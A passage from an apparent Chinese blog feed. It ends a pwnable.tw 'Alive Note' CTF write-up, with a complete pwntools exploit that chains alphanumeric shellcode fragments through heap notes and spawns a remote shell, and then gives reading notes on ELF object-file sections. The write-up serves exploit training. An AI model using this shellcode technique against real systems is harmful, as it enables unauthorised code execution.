function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,cmd=<span class="string">''</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE: addr = gdb_text_base + addr</span><br><span class="line">    log.warn(<span class="string">"breakpoint_addr --&gt; 0x%x"</span> % addr)</span><br><span class="line">    gdb.attach(io,<span class="string">"b *&#123;&#125;\nc\n"</span>.format(hex(addr))+cmd) </span><br><span class="line"></span><br><span class="line">add = <span class="keyword">lambda</span> index,name : (sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>),sla(<span class="string">"Index :"</span>,str(index)),sla(<span class="string">"Name :"</span>,name))</span><br><span class="line">show = <span class="keyword">lambda</span> index : (sla(<span class="string">"choice :"</span>,<span class="string">"2"</span>),sla(<span class="string">"Index :"</span>,str(index)))</span><br><span class="line">delate = <span class="keyword">lambda</span> index : (sla(<span class="string">"choice :"</span>,<span class="string">"3"</span>),sla(<span class="string">"Index :"</span>,str(index)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">-27</span>,<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">gdb.attach(io,<span class="string">"b*0x080488ea\nc\n"</span>)</span><br><span class="line">delate(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>步入即可看到执行shellcode时的寄存器值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EAX  0x0</span><br><span class="line">EBX  0x0</span><br><span class="line">ECX  0x0</span><br><span class="line">EDX  0x0</span><br><span class="line">EDI  0xf7f23000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d &#x2F;* 0x1b2db0 *&#x2F;</span><br><span class="line">ESI  0xf7f23000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d &#x2F;* 0x1b2db0 *&#x2F;</span><br><span class="line">EBP  0xffd62758 —▸ 0xffd62768 ◂— 0x0</span><br><span class="line">ESP  0xffd6272c —▸ 0x80488ef (del_note+81) ◂— add    esp, 0x10</span><br><span class="line">EIP  0x9df5008 ◂— &#39;aaaaaaaa&#39;</span><br></pre></td></tr></table></figure><p>接下来就可以开始shellcode的构造了，需要注意的是多个块之间的跳转，使用jne指令时，我们还需要考虑好两段shellcode中间间隔堆块的数量以便操作数在合法范围内。然后通过减法+异或构造出<code>int 0x80</code>指令。</p><p>同时还需要注意的是sys_read的参数传递（参考的网上WP…），我们delete的时候需要注意利用这里的传入参数来构造sys_read的参数</p><p>成功执行出sys_read：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x9727109    int    0x80 &lt;SYS_read&gt;</span><br><span class="line">       fd: 0x0</span><br><span class="line">       buf: 0x97270c8 ◂— &#39;Xj3X40u9&#39;</span><br><span class="line">       nbytes: 0x7a</span><br><span class="line">  0x972710b    add    byte ptr [eax], al</span><br></pre></td></tr></table></figure><p>0x10b - 0x0c8 = 0x43</p><p>故最后的payload构造为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x43</span></span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./alive_note"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = process(elf.path,env=&#123;<span class="string">"LD_PRELOAD"</span> : libc.path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./alive_note"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10300</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># misc functions</span></span><br><span class="line"><span class="string">uu32    = lambda data   :u32(data.ljust(4, b'\0'))</span></span><br><span class="line"><span class="string">uu64    = lambda data   :u64(data.ljust(8, b'\0'))</span></span><br><span class="line"><span class="string">leak    = lambda name,addr :log.success('&#123;&#125; : &#123;:#x&#125;'.format(name, addr))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># base addr</span></span><br><span class="line"><span class="string">gdb_text_base = int(os.popen("pmap &#123;&#125;".format(io.pid)).readlines()[1][4:16], 16)</span></span><br><span class="line"><span class="string">gdb_libc_base = int(os.popen("pmap &#123;&#125;| grep libc".format(io.pid)).readlines()[0][4:16], 16)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># debug function</span></span><br><span class="line"><span class="string">def debug(addr=0,cmd='',PIE=True):</span></span><br><span class="line"><span class="string">    if PIE: addr = gdb_text_base + addr</span></span><br><span class="line"><span class="string">    log.warn("breakpoint_addr --&gt; 0x%x" % addr)</span></span><br><span class="line"><span class="string">    gdb.attach(io,"b *&#123;&#125;\nc\n".format(hex(addr))+cmd) </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">add = <span class="keyword">lambda</span> index,name : (sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>),sla(<span class="string">"Index :"</span>,str(index)),sla(<span class="string">"Name :"</span>,name))</span><br><span class="line">show = <span class="keyword">lambda</span> index : (sla(<span class="string">"choice :"</span>,<span class="string">"2"</span>),sla(<span class="string">"Index :"</span>,str(index)))</span><br><span class="line">delete = <span class="keyword">lambda</span> index : (sla(<span class="string">"choice :"</span>,<span class="string">"3"</span>),sla(<span class="string">"Index :"</span>,str(index)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunk_pad</span> <span class="params">(num)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">add(<span class="number">10</span>,<span class="string">"aaaaaaa"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### PYjzZu9</span></span><br><span class="line">part1 = <span class="string">'''</span></span><br><span class="line"><span class="string">push eax</span></span><br><span class="line"><span class="string">pop ecx</span></span><br><span class="line"><span class="string">push 0x7a</span></span><br><span class="line"><span class="string">pop edx</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">part1 = asm(part1) + <span class="string">b"\x75\x39"</span></span><br><span class="line">add(<span class="number">-27</span>, part1)</span><br><span class="line">chunk_pad(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### SXH0AAu8</span></span><br><span class="line">part2 = <span class="string">'''</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">dec eax</span></span><br><span class="line"><span class="string">xor BYTE PTR [ecx+0x41], al</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">part2 = asm(part2) + <span class="string">b"\x75\x38"</span></span><br><span class="line">add(<span class="number">0</span>, part2)</span><br><span class="line">chunk_pad(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 490ABSu8</span></span><br><span class="line">part3 = <span class="string">'''</span></span><br><span class="line"><span class="string">xor al, 0x39</span></span><br><span class="line"><span class="string">xor BYTE PTR [ecx+0x42], al</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">part3 = asm(part3) + <span class="string">b"\x75\x38"</span></span><br><span class="line">add(<span class="number">0</span>, part3)</span><br><span class="line">chunk_pad(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Xj3X40u9</span></span><br><span class="line">part4 = <span class="string">'''</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">xor al, 0x30</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">part4 = asm(part4) + <span class="string">b"\x75\x39"</span></span><br><span class="line">add(<span class="number">1</span>, part4)</span><br><span class="line">chunk_pad(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 02F</span></span><br><span class="line">part5 = <span class="string">b"\x30\x32\x46"</span></span><br><span class="line">add(<span class="number">2</span>, part5)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,"b*0x080488ea\nc\n")</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## write shellcode to run next</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x43</span></span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://eqqie.cn/index.php/laji_note/1438/" target="_blank" rel="noopener">[pwnable.tw] Alive Note – 构造分段alpha_shellcode</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养读书笔记-第三章-目标文件里有什么</title>
      <link href="2020/12/19/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E9%87%8C%E6%9C%89%E4%BB%80%E4%B9%88/"/>
      <url>2020/12/19/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E9%87%8C%E6%9C%89%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<p>#第三章 目标文件里有什么</p><p>编译器编译源代码后生成的文件叫做<strong>目标文件</strong>，从结构上讲，它是已经编译后的可执行文件格式，只是还没有经过链接的过程。</p><h1 id="3-1-目标文件的格式"><a href="#3-1-目标文件的格式" class="headerlink" title="3.1 目标文件的格式"></a>3.1 目标文件的格式</h1><p>现在PC平台流行的<strong>可执行文件格式（Executable）</strong>主要是windows下的PE（Portable Executable）和linux下的ELF（Executable Linkable Format），它们都是COFF（Common file format）格式的变种。目标文件就是源代码编译后但未进行链接的那些中间文件（windows的.obj和linux下的.o）。</p><p>除了可执行文件，<strong>动态链接库（DLL，Dynamic Linking Library）</strong>（windows下的.dll和linux下的.so）和<strong>静态链接库（Static Linking Library）</strong>（windows下的.lib和linux的.a）文件都按照可执行文件格式存储。</p><p>elf文件标准里把系统中采用elf格式的文件归为如下所示的4类：</p><table><thead><tr><th align="center">ELF文件类型</th><th align="center">说明</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">可重定位文件（Relocatable File）</td><td align="center">这类文件包含了代码和数据，可以用来链接成可执行文件或共享目标文件，静态链接库也可以归为这一类</td><td align="center">linux的.o<br />windows的.obj</td></tr><tr><td align="center">可执行文件（Executable File）</td><td align="center">这类文件包含了可以直接执行的程序，它的代表就是elf可执行文件，它们一般都没有扩展名</td><td align="center">比如/bin/sh文件<br />windows的.exe</td></tr><tr><td align="center">共享目标文件（Shared Object File）</td><td align="center">这种文件包含了代码和数据，一种是链接器可以使用这种文件和其他的可重定位文件和共享目标文件链接，产生新的目标文件；第二种是动态链接器可以将几个这种共享目标文件与可执行文件结合，作为进程映象的一部分来运行</td><td align="center">linux的.so，如/lib/glibc-2.5.so<br />windows的DLL</td></tr><tr><td align="center">核心转储文件（Core Dump File）</td><td align="center">当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其他信息转储到核心转储文件</td><td align="center">linux下的core dump</td></tr></tbody></table><h1 id="3-2-目标文件是什么样的"><a href="#3-2-目标文件是什么样的" class="headerlink" title="3.2 目标文件是什么样的"></a>3.2 目标文件是什么样的</h1><p>目标文件中除了有编译后的机器指令代码、数据，还包含链接时需要的一些信息，比如符号表、调试信息、字符串等。一般目标文件将这些信息按不同的属性，以<strong>节（Section）</strong>的形式存储，有时候也叫<strong>段（segment）</strong>。</p><p>节和段唯一的 区别是中elf的链接视图和装载视图的时候，本书中默认统一称为“段”。</p><p>程序源代码编译后的机器指令经常放在<strong>代码段（Code Section）</strong>里，代码段常见的名字有”.code”或”.text”；全局变量和局部静态变量数据经常放在<strong>数据段（Data Section）</strong>里，数据段的一般名字叫”.data”。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-3-1.png"  alt=""></p><p>假设上图中格式是elf，可以看到elf文件的开头是一个”文件头”，它描述了整个文件的文件属性，包括文件是否可执行、是静态链接还是动态链接及入口地址（如果是可执行文件）、目标硬件、目标操作系统等信息，文件头还有一个用来描述文件中各个段的数组—-<strong>段表（Section Table）</strong>。</p><ul><li>一般c语言编译后执行语句都编译成机器代码，保存在.text段</li><li>已初始化的全局变量和局部静态变量都保存在.data段</li><li>未初始化的全局变量和局部静态变量一般放在.bss段<br><strong>bss段只是为未初始化的全局变量和局部静态变量预留位置</strong>，并没有内容，在文件中也不占据空间</li></ul><p><strong>总体来说，程序源代码被编译后主要分成两种段：程序指令和程序数据。代码段属于程序指令，而数据段和.bss段属于程序数据。</strong></p><p>数据和指令分段的好处主要有：</p><ul><li>可以方便的设置数据和指令的权限为可读写和只读，以防止指令被有意或无意地改写</li><li>现代cpu的缓存一般都被设计成数据缓存和指令缓存分离，程序的指令和数据被分开有利于cpu的缓存命中率提高</li><li>当系统中运行着多个该程序的副本时，内存中只需要保存一份该程序的指令部分，可以省下大量空间（除了指令，对于所有的只读数据也都一样）</li></ul><h1 id="3-3-挖掘SimpleSection-o"><a href="#3-3-挖掘SimpleSection-o" class="headerlink" title="3.3 挖掘SimpleSection.o"></a>3.3 挖掘SimpleSection.o</h1><p>以下列代码为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SimpleSection.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* format, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="keyword">int</span> global_uninit_var;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span> <span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> static_var = <span class="number">85</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> static_var2;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    </span><br><span class="line">    func1( static_var + static_var2 + a + b );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>  a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如不加说明，以下分析的都是32位的elf文件格式</p></blockquote><p>因为我使用的是64位的系统，所以想要将其编译成32位程序需要加上 -m32 参数，同时由于gcc版本、机器平台等因素的差异，我得出来的结果可能和书中的例图略有不同</p><p>我们使用gcc来编译这个文件（参数 -c 表示只编译不链接）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c SimpleSection.c</span><br><span class="line">$ objdump -h SimpleSection.o</span><br><span class="line"></span><br><span class="line">SimpleSection.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">  0 .text         00000062  00000000  00000000  00000034  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE</span><br><span class="line">  1 .data         00000008  00000000  00000000  00000098  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  2 .bss          00000004  00000000  00000000  000000a0  2**2</span><br><span class="line">                  ALLOC</span><br><span class="line">  3 .rodata       00000004  00000000  00000000  000000a0  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  4 .comment      00000036  00000000  00000000  000000a4  2**0</span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  5 .note.GNU-stack 00000000  00000000  00000000  000000da  2**0</span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  6 .eh_frame     00000064  00000000  00000000  000000dc  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA</span><br></pre></td></tr></table></figure><p>参数 -h 就是把elf文件的各个段的基本信息打印出来。我们也可以使用”objdump -x”打印出更多信息。</p><p>从上面的结果来看，SimpleSection.o中除了最基本的代码段、数据段和BSS段以外，还有三个段分别是<strong>只读数据段（.rodata）</strong>、<strong>注释信息段（.comment）</strong>和<strong>堆栈提示段（.note.GNU-stack）</strong>。</p><blockquote><p>书中并未出现.eh_frame段，所以下面对elf文件的解读也会忽略这个内容，我查找到的结果如下：</p><p>当gcc生成处理异常的某些代码时，它将生成可以描述如何展开堆栈的表。这些表在.eh_frame部分中找到。eh = exception handling。.eh_frame包含异常展开和源语言信息，其中，每个条目均由单个CFI表示。</p><p>来源：<a href="https://stackoverrun.com/cn/q/6504461" target="_blank" rel="noopener">https://stackoverrun.com/cn/q/6504461</a></p></blockquote><p>我们首先看看几个重要的段的属性，最容易理解的是段的长度（Size）和段所在的位置（File Offset）</p><blockquote><p>LMA： 加载地址，如加载到RAM中等，在嵌入式中，有可能是在ROM中（这时LMA!=VMA）<br>VMA： 虚拟地址，就是程序运行时的地址，一般就是内存地址，如要把ROM中的数据加载到RAM中运行。</p><p>Algn：对齐</p></blockquote><p>第二行中的”CONTENTS”、”ALLOC”等表示段的各种属性，”CONTENTS”表示该段在文件中存在，.note.GNU-stack比较奇怪，我们暂且忽略</p><p>结构如图</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-3-2.png"  alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ size -A SimpleSection.o</span><br><span class="line">SimpleSection.o  :</span><br><span class="line">section           size   addr</span><br><span class="line">.text               98      0</span><br><span class="line">.data                8      0</span><br><span class="line">.bss                 4      0</span><br><span class="line">.rodata              4      0</span><br><span class="line">.comment            54      0</span><br><span class="line">.note.GNU-stack      0      0</span><br><span class="line">.eh_frame          100      0</span><br><span class="line">Total              268</span><br></pre></td></tr></table></figure><blockquote><p>如果直接用size来查看大小，.text长度会过大。因为size默认是运行在”Berkeley compatibility mode”下。在这种模式下，会将不可执行的拥有”ALLOC”属性的只读段归到.text段下，很典型的就是.rodata段。如果你使用”size -A obj.o”，那么size会运行在”System V compatibility mode”，此时，用objdump -h和size显示的.text段大小就差不多了。</p></blockquote><p>我们来看看这些段都包含了什么内容</p><h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><p>objdump的 -s 参数可以将所有段段内容以十六进制的方式打印出来，-d 参数可以将所有包含指令的段反汇编，以下为打印出的内容（省略号表示可以忽略的无关内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s -d SimpleSection.o</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 5589e583 ec0883ec 08ff7508 68000000  U.........u.h...</span><br><span class="line"> 0010 00e8fcff ffff83c4 1090c9c3 8d4c2404  .............L$.</span><br><span class="line"> 0020 83e4f0ff 71fc5589 e55183ec 14c745f0  ....q.U..Q....E.</span><br><span class="line"> 0030 01000000 8b150400 0000a100 00000001  ................</span><br><span class="line"> 0040 c28b45f0 01c28b45 f401d083 ec0c50e8  ..E....E......P.</span><br><span class="line"> 0050 fcffffff 83c4108b 45f08b4d fcc98d61  ........E..M...a</span><br><span class="line"> 0060 fcc3                                 ..              </span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">00000000 &lt;func1&gt;:</span><br><span class="line">   0:55                   push   %ebp</span><br><span class="line">   1:89 e5                mov    %esp,%ebp</span><br><span class="line">   3:83 ec 08             sub    $0x8,%esp</span><br><span class="line">   6:83 ec 08             sub    $0x8,%esp</span><br><span class="line">   9:ff 75 08             pushl  0x8(%ebp)</span><br><span class="line">   c:68 00 00 00 00       push   $0x0</span><br><span class="line">  11:e8 fc ff ff ff       call   12 &lt;func1+0x12&gt;</span><br><span class="line">  16:83 c4 10             add    $0x10,%esp</span><br><span class="line">  19:90                   nop</span><br><span class="line">  1a:c9                   leave  </span><br><span class="line">  1b:c3                   ret    </span><br><span class="line"></span><br><span class="line">0000001c &lt;main&gt;:</span><br><span class="line">  1c:8d 4c 24 04          lea    0x4(%esp),%ecx</span><br><span class="line">  20:83 e4 f0             and    $0xfffffff0,%esp</span><br><span class="line">  23:ff 71 fc             pushl  -0x4(%ecx)</span><br><span class="line">  26:55                   push   %ebp</span><br><span class="line">  27:89 e5                mov    %esp,%ebp</span><br><span class="line">  29:51                   push   %ecx</span><br><span class="line">  2a:83 ec 14             sub    $0x14,%esp</span><br><span class="line">  2d:c7 45 f0 01 00 00 00 movl   $0x1,-0x10(%ebp)</span><br><span class="line">  34:8b 15 04 00 00 00    mov    0x4,%edx</span><br><span class="line">  3a:a1 00 00 00 00       mov    0x0,%eax</span><br><span class="line">  3f:01 c2                add    %eax,%edx</span><br><span class="line">  41:8b 45 f0             mov    -0x10(%ebp),%eax</span><br><span class="line">  44:01 c2                add    %eax,%edx</span><br><span class="line">  46:8b 45 f4             mov    -0xc(%ebp),%eax</span><br><span class="line">  49:01 d0                add    %edx,%eax</span><br><span class="line">  4b:83 ec 0c             sub    $0xc,%esp</span><br><span class="line">  4e:50                   push   %eax</span><br><span class="line">  4f:e8 fc ff ff ff       call   50 &lt;main+0x34&gt;</span><br><span class="line">  54:83 c4 10             add    $0x10,%esp</span><br><span class="line">  57:8b 45 f0             mov    -0x10(%ebp),%eax</span><br><span class="line">  5a:8b 4d fc             mov    -0x4(%ebp),%ecx</span><br><span class="line">  5d:c9                   leave  </span><br><span class="line">  5e:8d 61 fc             lea    -0x4(%ecx),%esp</span><br><span class="line">  61:c3                   ret</span><br></pre></td></tr></table></figure><p>“Contents of section 